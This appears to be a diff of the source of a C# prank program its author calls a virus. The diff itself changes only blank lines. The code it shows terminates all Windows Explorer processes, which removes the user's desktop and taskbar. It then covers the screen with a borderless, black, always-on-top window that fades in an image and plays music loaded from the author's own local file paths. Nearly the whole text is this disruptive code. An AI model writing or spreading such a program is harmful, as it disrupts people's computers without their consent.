@@ -20,7 +20,6 @@ namespace yasser_virus {
         public static void Main() {
             
             foreach (var process in Process.GetProcessesByName("explorer")) {
-                
                 process.Kill();
             }
             Application.Run(new Program());
@@ -32,7 +31,7 @@ namespace yasser_virus {
             this.FormBorderStyle = FormBorderStyle.None;
             this.BackColor = Color.Black;
             this.TopMost = true;
-
+            
             pictureBox = new PictureBox {
                 
                 Image = Image.FromFile(@"C:\Users\Nikolay\Downloads\Save_webP\channels4_profile_jpg(1).png"),
@@ -42,21 +41,18 @@ namespace yasser_virus {
                 SizeMode = PictureBoxSizeMode.StretchImage,
                 Visible = false
             };
+            
             this.Controls.Add(pictureBox);
-
             fadeInTimer = new Timer {
-                
                 Interval = 50
             };
             fadeInTimer.Tick += FadeInTimer_Tick;
-
             player = new System.Media.SoundPlayer(@"C:\Users\Nikolay\Documents\yasser virus\spotifydown.com - Montagem Lunar Diamante - Slowed - DJ DYLANFK (mp3cut.net).wav");
 
             new Thread(() => {
                 
                 Thread.Sleep(1000);
                 this.Invoke((Action)(() => {
-                    
                     pictureBox.Visible = true;
                     fadeInTimer.Start();
                     new Thread(PlayMusic).Start();
@@ -67,12 +63,10 @@ namespace yasser_virus {
         private void FadeInTimer_Tick(object sender, EventArgs e) {
             
             if (opacity < 1.0f) {
-                
                 opacity += 0.05f;
                 pictureBox.Image = SetImageOpacity(pictureBox.Image, opacity);
             }
             else {
-                
                 fadeInTimer.Stop();
             }
         }
@@ -81,19 +75,15 @@ namespace yasser_virus {
             
             Bitmap bmp = new Bitmap(image.Width, image.Height);
             using (Graphics gfx = Graphics.FromImage(bmp)) {
-                
                 ColorMatrix matrix = new ColorMatrix {
-                    
                     Matrix33 = opacity
                 };
 
                 ImageAttributes attributes = new ImageAttributes();
                 attributes.SetColorMatrix(matrix, ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
-
                 gfx.DrawImage(image, new Rectangle(0, 0, bmp.Width, bmp.Height),
                               0, 0, image.Width, image.Height, GraphicsUnit.Pixel, attributes);
             }
-
             return bmp;
         }
 
@@ -101,7 +91,6 @@ namespace yasser_virus {
             
             player.Play();
             while (musicVolume < 1.0f) {
-                
                 musicVolume += 0.05f;
                 Thread.Sleep(100);
             }
